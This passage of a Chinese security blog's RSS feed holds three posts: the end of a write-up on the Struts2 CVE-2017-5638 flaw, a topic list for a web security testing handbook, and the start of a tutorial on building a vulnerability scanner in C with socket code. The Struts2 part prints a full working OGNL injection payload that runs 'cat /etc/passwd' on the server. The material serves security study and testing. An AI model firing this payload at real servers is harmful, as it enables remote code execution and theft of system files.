  &lt;p&gt;Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。&lt;/p&gt;

  &lt;p&gt;CVE-ID : CVE-2017-5638&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行&lt;/p&gt;

&lt;p&gt;测试Payload：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x01.png&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;p&gt;升级插件、框架新版本&lt;/p&gt;
</description>
        <pubDate>Thu, 22 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-22/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-22/1</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>准备在博客记录Web安全测试学习手册</title>
        <description>&lt;p&gt;准备在博客记录Web安全测试学习手册，先把目录列出来，之前参考了OWASP测试指南，写了一份Word，但是在Word里不好阐述风险的成因以及危害，所以针对每个风险我会以环境来详细的扣清楚。
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-配置管理测试&quot;&gt;0x01 配置管理测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;远程代码执行&lt;/li&gt;
  &lt;li&gt;Slow HTTP DDOS&lt;/li&gt;
  &lt;li&gt;点击劫持：X-Frame-Options头丢失&lt;/li&gt;
  &lt;li&gt;服务器启用了不安全的HTTP方法&lt;/li&gt;
  &lt;li&gt;中间件版本信息泄露&lt;/li&gt;
  &lt;li&gt;服务器端目录遍历&lt;/li&gt;
  &lt;li&gt;中间件解析漏洞&lt;/li&gt;
  &lt;li&gt;IIS短文件名漏洞&lt;/li&gt;
  &lt;li&gt;应用程序未容错&lt;/li&gt;
  &lt;li&gt;SVN文件泄露&lt;/li&gt;
  &lt;li&gt;OpenSSL心脏出血漏洞&lt;/li&gt;
  &lt;li&gt;SSL/TLS “受戒礼”漏洞&lt;/li&gt;
  &lt;li&gt;SSL POODLE漏洞&lt;/li&gt;
  &lt;li&gt;分布式部署文件可读&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-数据验证测试&quot;&gt;0x02 数据验证测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;XSS跨站脚本攻击&lt;/li&gt;
  &lt;li&gt;SQL注入&lt;/li&gt;
  &lt;li&gt;任意文件读取&lt;/li&gt;
  &lt;li&gt;任意文件上传漏洞&lt;/li&gt;
  &lt;li&gt;XML实体注入&lt;/li&gt;
  &lt;li&gt;代码注入&lt;/li&gt;
  &lt;li&gt;命令注入&lt;/li&gt;
  &lt;li&gt;任意文件下载&lt;/li&gt;
  &lt;li&gt;本地文件包含&lt;/li&gt;
  &lt;li&gt;远程文件包含&lt;/li&gt;
  &lt;li&gt;框架注入&lt;/li&gt;
  &lt;li&gt;链接注入&lt;/li&gt;
  &lt;li&gt;SSRF服务器请求伪造&lt;/li&gt;
  &lt;li&gt;CSRF跨站请求伪造&lt;/li&gt;
  &lt;li&gt;任意URL跳转&lt;/li&gt;
  &lt;li&gt;JSON劫持&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x03-会话管理测试&quot;&gt;0x03 会话管理测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;会话固定&lt;/li&gt;
  &lt;li&gt;多次登录错误锁定机制&lt;/li&gt;
  &lt;li&gt;COOKIE未设置HTTP Only属性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-业务逻辑测试&quot;&gt;0x04 业务逻辑测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;任意用户密码重置&lt;/li&gt;
  &lt;li&gt;图形验证码绕过&lt;/li&gt;
  &lt;li&gt;短信验证码绕过&lt;/li&gt;
  &lt;li&gt;短信验证码重放&lt;/li&gt;
  &lt;li&gt;业务流程绕过&lt;/li&gt;
  &lt;li&gt;加密算法脆弱&lt;/li&gt;
  &lt;li&gt;支付逻辑漏洞&lt;/li&gt;
  &lt;li&gt;条件竞争(HTTP并发)&lt;/li&gt;
  &lt;li&gt;前端认证绕过&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x05-身份认证测试&quot;&gt;0x05 身份认证测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;账号弱口令&lt;/li&gt;
  &lt;li&gt;登录错误消息凭证枚举&lt;/li&gt;
  &lt;li&gt;空口令攻击&lt;/li&gt;
  &lt;li&gt;垂直越权&lt;/li&gt;
  &lt;li&gt;水平越权&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x06-结语&quot;&gt;0x06 结语&lt;/h2&gt;

&lt;p&gt;这些测试项参考了OWASP测试指南与AWVS扫描报告&lt;/p&gt;

&lt;p&gt;：D 如果有什么缺陷，还望联系我补充。&lt;/p&gt;

&lt;p&gt;另外，每一篇的参考链接都会放在文末，只是做一些方便工作归档的整理。&lt;/p&gt;

</description>
        <pubDate>Wed, 21 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-21/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-21/1</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>浅谈使用C语言开发服务端漏洞扫描设计</title>
        <description>&lt;p&gt;本文记录一下自己学习这么久以来，目前设计的漏洞扫描最好的方式
&lt;!--more--&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;都是自己闷头搞出来的经验，对于自己是经验，对大家就不知道合不合口味了。&lt;/p&gt;

&lt;p&gt;本文可能过多的穿插以下知识点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;套接字&lt;/li&gt;
  &lt;li&gt;协议选择&lt;/li&gt;
  &lt;li&gt;服务端模型&lt;/li&gt;
  &lt;li&gt;信号处理&lt;/li&gt;
  &lt;li&gt;多进程、多线程&lt;/li&gt;
  &lt;li&gt;任务派发过程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;能尽量图示就图示了。顺便总结一下自己网络编程的经验。 :D&lt;/p&gt;

&lt;h2 id=&quot;0x01-网络套接字socket&quot;&gt;0x01 网络套接字(SOCKET)&lt;/h2&gt;

&lt;h3 id=&quot;什么是套接字&quot;&gt;什么是套接字&lt;/h3&gt;

&lt;p&gt;在我的理解中，网络套接字是一个被封装在传输层与应用层之间的API接口。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-20/0x01.jpg&quot; alt=&quot;enter description here&quot; title=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;每一个方法都被操作系统支持，我们只需要知道创建套接字的流程以及网络基本知识就可以进行套接字的编程了。&lt;/p&gt;

&lt;p&gt;许多的远程利用攻击、漏洞验证工具都离不开套接字，没有套接字就没有现在能够进行“进程”与“进程”之间通信的过程实现。&lt;/p&gt;

&lt;p&gt;下面引用百科的解释：&lt;/p&gt;

&lt;p&gt;TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。&lt;/p&gt;

&lt;p&gt;套接字用（IP地址：端口号）表示。&lt;/p&gt;

&lt;p&gt;它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。&lt;/p&gt;

&lt;p&gt;听起来还是非常模糊、太抽象了！&lt;/p&gt;

&lt;p&gt;那么我们来看看它到底是什么？&lt;/p&gt;

&lt;h3 id=&quot;套接字的地址结构&quot;&gt;套接字的地址结构&lt;/h3&gt;

&lt;p&gt;刚才百科告诉我们，套接字用（IP地址：端口号）表示。&lt;/p&gt;

&lt;p&gt;那么在网络编程中如何告诉计算机，什么是端口，什么是端口号呢？&lt;/p&gt;

&lt;p&gt;于是出现了被计算机界公认的结构体，这个结构体保存在系统的标准库中：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;arpa/inet.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;__SOCKADDR_COMMON&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;in_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* Port number.  */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in_addr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* Internet address.  */&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Pad to size of `struct sockaddr'.  */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
			   &lt;span class=&quot;n&quot;&gt;__SOCKADDR_COMMON_SIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
			   &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
			   &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看起来还是比较复杂的，但是用起来一点都不复杂。&lt;/p&gt;

&lt;h3 id=&quot;套接字的类型3种&quot;&gt;套接字的类型（3种）&lt;/h3&gt;

&lt;p&gt;套接字的类型一般在创建套接字描述符的时候用到。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;SOCK_STREAM 字节流套接字  — TCP&lt;/li&gt;
  &lt;li&gt;SOCK_DGRAM 数据报套接字   —  UDP&lt;/li&gt;
  &lt;li&gt;SOCK_SEQPACKET 有序分组套接字 — ALL&lt;/li&gt;
  &lt;li&gt;SOCK_RAW 原始套接字   — ALL&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;套接字描述符&quot;&gt;套接字描述符&lt;/h3&gt;

&lt;p&gt;这里就要引入一个&lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;函数了，它在C语言的头文件中：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__protocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该函数用于创建描述符&lt;/p&gt;

&lt;p&gt;我们的操作系统中此时此刻有很多网络连接，为了区分他们，我们就给它们编个号，也就相当于我们自己的身份证。有了身份证做其他事情就比较方便了。&lt;/p&gt;

&lt;h3 id=&quot;网络字节序&quot;&gt;网络字节序&lt;/h3&gt;

&lt;p&gt;不同的CPU有不同的字节序类型，这些字节序是指 整数 在内存中保存的顺序，这个叫做 主机序。&lt;/p&gt;

&lt;p&gt;最常见的有两种：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1．将低序字节存储在起始地址（小端）&lt;/li&gt;
  &lt;li&gt;2．将高序字节存储在起始地址（大端）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;俗称 大端、小端字节序&lt;/p&gt;

&lt;p&gt;网络字节顺序是TCP/IP中规定好的一种数据表示格式，它与具体的CPU类型、操作系统等无关，从而可以保证数据在不同主机之间传输时能够被正确解释。网络字节顺序采用大端排序方式。&lt;/p&gt;

&lt;p&gt;而我们的操作系统，一般是小端排序方式，所以需要进行字节序的转换。&lt;/p&gt;

&lt;h3 id=&quot;创建套接字的过程&quot;&gt;创建套接字的过程&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-20/0x02.jpg&quot; alt=&quot;enter description here&quot; title=&quot;0x02&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这里，我们就需要动手写代码了！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-20/0x03.png&quot; alt=&quot;enter description here&quot; title=&quot;0x03&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;arpa/inet.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8877&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;serverSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientSockLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;clientSockLen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*]Listen Port : %d &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSockLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*]Client %s Connected .. &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inet_ntoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*]Recv : %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvBuff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这只是一个简单的TCP服务端，只能发送一次内容，就会断开连接&lt;/p&gt;

&lt;h2 id=&quot;0x02-协议选择&quot;&gt;0x02 协议选择&lt;/h2&gt;

&lt;p&gt;由于是任务处理的服务端，我比较倾向于UDP协议，无需繁琐的握手，只需要发送接收一次即可。&lt;/p&gt;

&lt;p&gt;这个后面的服务端模型会介绍到为什么选择UDP协议。&lt;/p&gt;

&lt;h3 id=&quot;tcp与udp区别总结&quot;&gt;TCP与UDP区别总结：&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接&lt;/li&gt;
  &lt;li&gt;2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保   证可靠交付&lt;/li&gt;
  &lt;li&gt;3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的
UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）&lt;/li&gt;
  &lt;li&gt;4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信&lt;/li&gt;
  &lt;li&gt;5、TCP首部开销20字节;UDP的首部开销小，只有8个字节&lt;/li&gt;
